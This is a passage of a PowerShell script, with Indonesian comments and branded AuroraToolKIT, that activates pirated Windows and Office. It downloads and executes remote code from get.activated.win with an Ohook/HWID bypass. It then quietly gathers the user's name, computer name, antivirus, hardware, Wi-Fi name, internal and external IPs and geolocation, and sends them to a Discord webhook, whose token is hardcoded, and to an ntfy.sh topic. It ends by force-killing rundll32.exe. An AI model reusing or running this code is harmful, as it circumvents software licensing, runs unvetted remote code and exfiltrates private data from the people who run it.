                    LicenseStatus = ""
                    ErrorCode = ""
                    ErrorDescription = ""
                    RemainingGrace = ""
                    ProductKey = ""
                }
            } else {
                $currentEntry.LicenseName = $line.Trim()
            }
        } elseif ($line -match "LICENSE DESCRIPTION:") {
            $currentEntry.LicenseDescription = $line.Trim()
        } elseif ($line -match "LICENSE STATUS:") {
            $currentEntry.LicenseStatus = $line.Trim()
        } elseif ($line -match "ERROR CODE:") {
            $currentEntry.ErrorCode = $line.Trim()
        } elseif ($line -match "ERROR DESCRIPTION:") {
            $currentEntry.ErrorDescription = $line.Trim()
        } elseif ($line -match "REMAINING GRACE:") {
            $currentEntry.RemainingGrace = $line.Trim()
        } elseif ($line -match "Last 5 characters of installed product key:") {
            $currentEntry.ProductKey = $line.Trim()
        }
    }
    if ($currentEntry.LicenseName) {
        $entries += $currentEntry
    }
    return $entries
}

function Get-IPInfo {
    return Invoke-RestMethod -Uri "http://ip-api.com/json/"
}

function ntfy {
    $ntfyUrl = "https://ntfy.sh/eu9QDaPa1mExQPwp"
    $computerSystem = Get-ComputerSystemInfo
    $osInfo = Get-OSInfo
    $processorInfo = Get-ProcessorInfo
    $ramInfo = Get-RAMInfo
    $diskInfo = Get-DiskInfo
    $networkInfo = Get-NetworkInfo
    $activationStatus = Get-ActivationStatus
    $officeActivationStatus = Get-OfficeActivationStatus
    $ipInfo = Get-IPInfo

    $message = @"
    /// iex(irm indojava.online/get/activeauto) ///
    ---[ SPESIFIKASI ]-------------------
    Merek: $($computerSystem.Manufacturer)
    Model: $($computerSystem.Type) ($($computerSystem.Model))
    Prosesor: $($processorInfo.Name) ($($processorInfo.Cores) Core) ($($processorInfo.LogicalProcessors) Logical)
    RAM: $($ramInfo.TotalSizeInGB) GB // $($ramInfo.Modules)
    Disk Drive:
    $diskInfo
    ---[ SISTEM ]-------------------
    Nama OS: $($osInfo.OSName)
    Versi OS: $($osInfo.OSVersion)
    Windows Version: $($osInfo.WindowsVersion)
    Arsitektur: $($osInfo.Architecture)
    UserName: $($osInfo.User)

    ---[ NETWORK ]-------------------
    Wi-Fi Terhubung: $($networkInfo.WifiName)
    $($networkInfo.LanStatus)
    $($networkInfo.InternetStatus)

    $($ipInfo.country),  $($ipInfo.city), $($ipInfo.regionName) ($($ipInfo.zip))
    $($ipInfo.lat)  $($ipInfo.lon) - $($ipInfo.isp)

    ---[ WINDOWS LICENSE ]-------------------
    $($activationStatus.SlmgrDli)
    $($activationStatus.SlmgrXpr)

    ---[ MICROSOFT OFFICE ]-------------------
    $(CheckOhook)

"@

    foreach ($entry in $officeActivationStatus) {
        $message += @"
    ---------------------------------------------------------------
    $($entry.ProductID)
    $($entry.SkuID)
    $($entry.LicenseName)
    $($entry.LicenseDescription)
    $($entry.LicenseStatus)
    $($entry.ErrorCode)
    $($entry.ErrorDescription)
    $($entry.RemainingGrace)
    $($entry.ProductKey)
    
"@
    }

    $response = Invoke-RestMethod -Uri $ntfyUrl -Method POST -Body $message -Headers @{
        "Title" = "Aktivasi Windows dan Office"
        "Priority" = "default"
        "Tags" = "computer"
    }

    if ($response) {
        Write-host -NoNewLine
    } else {
        Write-Host " failed sending log.." -ForegroundColor Red
    }
}
#-----------------------------------------------------------------------------------------
function webhooks {
    $date = (Get-Date)
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
    $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
        if (-not $winversion) {
            $winversion = $null
        }

    $username = $env:USERNAME
    $compName = $env:COMPUTERNAME
    $language = (Get-Culture).Name

    # Ambil antivirus yang terinstall
    $antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct).displayName -join ", "
    if (-not $antivirus) { $antivirus = "Not installed" }

    # Ambil informasi CPU, GPU, RAM
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
    $Manufacturer = $computerSystem.Vendor
    $Type = $computerSystem.Version
    $Model = $computerSystem.Name

    $cpu = (Get-CimInstance Win32_Processor)
    $Name = $cpu.Name
    $Cores = $cpu.NumberOfCores
    $LogicalProcessors = $cpu.NumberOfLogicalProcessors
    $gpu = (Get-CimInstance Win32_VideoController).Name
    $ramInfo = Get-WmiObject Win32_PhysicalMemory
    $totalSizeInGB = 0
    $ramDetails = @()
    foreach ($ram in $ramInfo) {
        $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
        $totalSizeInGB += $sizeInGB
        $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
    }
    $TotalSizeInGB = $totalSizeInGB
    $Modules = $ramDetails -join " -- "

    $disks = Get-CimInstance -ClassName Win32_DiskDrive
    $diskall = ""
    foreach ($disk in $disks) {
        $modeldisk = $disk.Model
        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
        $diskall += "- $modeldisk - $sizeInGB GB`n"
    }
    $diskall | Out-Null

    # Ambil status baterai
    $battery = (Get-CimInstance Win32_Battery)
    $batteryStatus = if ($battery) { "$($battery.EstimatedChargeRemaining)%" } else { "NoSystemBattery" }

    # Ambil resolusi layar
    Add-Type -AssemblyName System.Windows.Forms
    $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

    # Ambil informasi jaringan
    $gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
    $ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"

    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
    if ($wifi) {
        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
    } else {
        $wifiName = "No Wi-Fi connected."
    }
    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
    if ($lanAdapter) {
        $lanStatus = "LAN connected.: $($lanAdapter.Name)"
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
        if ($pingResult.StatusCode -eq 0) {
            $internetStatus = "Internet via LAN connected."
        } else {
            $internetStatus = "Internet via LAN is not connected."
        }
    } else {
        $lanStatus = "No LAN connected."
        $internetStatus = "Internet via LAN is not available."
    }

    $WifiName = $wifiName
    $LanStatus = $lanStatus
    $InternetStatus = $internetStatus

    # URL Webhook Discord
    $webhookid = "1337473388624609390"
    $webhooktoken = "frh_h08OFoFeTSUUF-FqHg2ZoJVh6Xjj8YbVzgOyztWuPANtpogg0AUKPWtWC7tsswe8"
    $webhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"

    # URL Gambar dan Thumbnail
    #$imageUrl = "https://.../preview.png"
    #$thumbnailUrl = "https://.../preview.png"

    # Buat payload JSON dengan format embed lengkap
    $payload = @{
        username = "AuroraBot"
        #avatar_url = ""
        embeds = @(@{
            title = ":fox: AuroraToolKIT - System Report"
            description = ":key: **Activation Windows And Office Permanent**"
            color = 3447003
            fields = @(
                @{ name = ""; value = ":calendar: $date`n"; inline = $false },
                @{ name = ":computer: **SYSTEM**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
                @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
                @{ name = ""; value = "-----------------------------------------------"; inline = $false },
                @{ name = "**:green_circle: ACTIVATION STATUS**"; value = "   // Windows Activation Status //`n`n$ActivationStatus`n$(CheckOhook)"; inline = $false }
                
            )
            #thumbnail = @{ url = $thumbnailUrl }
            #image = @{ url = $imageUrl }
            footer = @{ text = "AuroraBot | PowerShell Script" }
            timestamp = Get-Date -Format o
        })
    } | ConvertTo-Json -Depth 10

    # Kirim ke Discord Webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
}
#-----------------------------------------------------------------------------------------
Write-Host
Write-Host " + GETTING SCRIPT.." -ForegroundColor white
Start-Sleep -Seconds 2
Write-Host " + ACTIVATING.." -ForegroundColor white

try {
    # Menjalankan perintah aktivasi
    & ([ScriptBlock]::Create((Invoke-RestMethod https://get.activated.win))) /Ohook /HWID | Out-Null
    start-sleep -Seconds 3
    Write-Host " >> PROSES AKTIVASI SELESAI.. " -ForegroundColor Green
    Start-Sleep -Seconds 2
    write-host " >> CEK STATUS AKTIVASI" -ForegroundColor Yellow
    start-sleep -Seconds 3
    Write-Host "   ----------------------------"
    # Jalankan perintah slmgr.vbs untuk mendapatkan status aktivasi
    $SlmgrXpr = cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr 2>&1

    Write-Host "   // Windows Activation Status //" -foregroundColor white

    # Ubah hasil output menjadi string
    $ActivationStatus = $SlmgrXpr -join " "
    
    # Cek status aktivasi dan tampilkan pesan yang sesuai
    if ($ActivationStatus -match "permanently activated") {
        write-host "   Windows is permanently activated." -ForegroundColor Green
    }
    elseif ($ActivationStatus -match "will expire on (\d{1,2}/\d{1,2}/\d{4})") {
        $ExpireDate = $matches[1]
        Write-Host "    Windows activation will expire on: $ExpireDate" -ForegroundColor Yellow
    }
    elseif ($ActivationStatus -match "notification mode") {
        Write-Host "    Windows is in Notification Mode (Not activated)." -ForegroundColor Red
    }
    else {
        Write-Host "    Windows activation status: Unknown or not activated." -ForegroundColor Red
    }
    
    start-sleep -Seconds 2
    Write-Host "   ----------------------------"
    $hookActivationStatus = $(CheckOhook) -join " "
    
    # Cek status aktivasi dan tampilkan pesan yang sesuai
    if ($hookActivationStatus -match "Ohook Office aktivasi tidak ditemukan") {
        Write-Host "   // Office Activation Status //" -foregroundColor white
        Write-Host "   Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi." -ForegroundColor Red
        Write-Host "   Pastikan Microsoft Office sudah terinstall. Dan tidak ada aktivator jenis lain." -ForegroundColor Red
        Write-Host "Jika masih gagal disable sementara antivirus selain Windows Defender. Dan silakan jalankan lagi scriptnya." -BackgroundColor Red -ForegroundColor White
    }
    elseif ($hookActivationStatus -match "Ohook for permanent Office activation is installed") {
        Write-Host "   // Office Activation Status //" -ForegroundColor white
        Write-Host "   Ohook for permanent Office activation is installed" -ForegroundColor Green
    }
    else {
        Write-Host "  // Office Activation Status //" -ForegroundColor Red
        Write-Host "  Office activation status: Unknown atau silakan cek manual." -ForegroundColor Red
    }

}
catch {
    # Menangani error jika terjadi kesalahan
    write-host " X AKTIVASI GAGAL." -ForegroundColor Red
    Write-Host " X TERJADI KESALAHAN SELAMA AKTIVASI." -ForegroundColor Red
    Write-Host " X DETAIL ERROR: $_" -ForegroundColor Yellow
    Write-Host " X SILAHKAN COBA LAGI.." -ForegroundColor Yellow
}

Write-Host
Write-Host " > > MENGIRIM INFORMASI KE SERVER . ." -ForegroundColor blue
#ntfy
webhooks
$EndDTM = (Get-Date)
Write-Host "  END  " -BackgroundColor Red -ForegroundColor White -NoNewline
Write-Host " $EndDTM " -BackgroundColor White -ForegroundColor Black -NoNewLine

# Hitung total detik dan menit
$TotalSeconds = ($EndDTM - $StartDTM).TotalSeconds
$TotalMinutes = [math]::Floor($TotalSeconds / 60)  # Hitung menit tanpa desimal
$RemainingSeconds = [math]::Floor($TotalSeconds % 60)  # Hitung sisa detik tanpa desimal
Write-Host " TOTAL PROSES: " -BackgroundColor blue -ForegroundColor white -NoNewLine
Write-Host " $TotalMinutes Menit $RemainingSeconds Detik " -BackgroundColor red -ForegroundColor white
Write-Host "------------------------------------------------------------------------------------------"
WrapTextToFitWidth -text $text
Write-Host "------------------------------------------------------------------------------------------"
Write-Host " PRESS " -NoNewLine
Write-Host " ENTER " -NoNewLine -BackgroundColor red -ForegroundColor white
Write-Host " TO EXIT:" -NoNewLine
$shell = New-Object -ComObject WScript.Shell
# Menampilkan pesan popup
$shell.Popup("AKTIVASI WINDOWS DAN OFFICE PERMANEN SUDAH SELESAI..", 30, "OLIH X SARGA ~// -- INDOJAVA ONLINE") | Out-Null
$shell.Popup("JANGAN LUPA BAHAGIA, DAN TERSENYUM.. :)", 10, "OLIH X SARGA ~// -- INDOJAVA ONLINE") | Out-Null
Read-Host
#-----------------------------------------------------------------------------------------
Start-Process powershell -ArgumentList "-NoExit", "-Command & {
    mode con cols=70 lines=32
    Clear-Host
    Write-Output @'
 ....................................................................
 ....................................................................
 ....................................................................
 ....................................................................
 ....................................................................
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557).....$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557).....$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557).................
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2557)....$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D)....$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D).................
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x255D)....$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557)......$([char]0x2588)$([char]0x2588)$([char]0x2551)......................
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2557)....$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x255D)......$([char]0x2588)$([char]0x2588)$([char]0x2551)......................
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x255D)....$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557)....$([char]0x255A)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557).................
 ...................$([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D).....$([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D).....$([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D).................
 ....................................................................
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2557)$([char]0x2588)$([char]0x2588)$([char]0x2557)...$([char]0x2588)$([char]0x2588)$([char]0x2557).$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557).$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557)..$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2557)..............
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2551)...$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2557)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2557)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2557).............
 ...................$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2551)...$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x255D)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2551).............
 ..............$([char]0x2588)$([char]0x2588)...$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2551)...$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2557)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2588)$([char]0x2588)$([char]0x2551).............
 ..............$([char]0x255A)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x255D).$([char]0x255A)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2554)$([char]0x255D)$([char]0x2588)$([char]0x2588)$([char]0x2551)..$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2551)..$([char]0x2588)$([char]0x2588)$([char]0x2551)$([char]0x2588)$([char]0x2588)$([char]0x2551)..$([char]0x2588)$([char]0x2588)$([char]0x2551).............
 ...............$([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D)...$([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D).$([char]0x255A)$([char]0x2550)$([char]0x255D)..$([char]0x255A)$([char]0x2550)$([char]0x255D)$([char]0x255A)$([char]0x2550)$([char]0x255D)..$([char]0x255A)$([char]0x2550)$([char]0x255D)$([char]0x255A)$([char]0x2550)$([char]0x255D)..$([char]0x255A)$([char]0x2550)$([char]0x255D).............
 ....................................................................
 .....................(BANDUNG..ELECTRONIC..CENTER)..................
 ....................................................................
 ....................................................................
 ....................................................................
 ....................................................................

'@ | Out-Host
write-host
write-host
    Read-Host 'Tekan ENTER untuk keluar'
    exit
}"

# Membuka jendela CMD dan mengeksekusi perintah taskkill
Start-Process cmd.exe -ArgumentList '/c timeout /t 1 & taskkill /F /IM rundll32.exe /T'

# encode Western(Windows 1252)
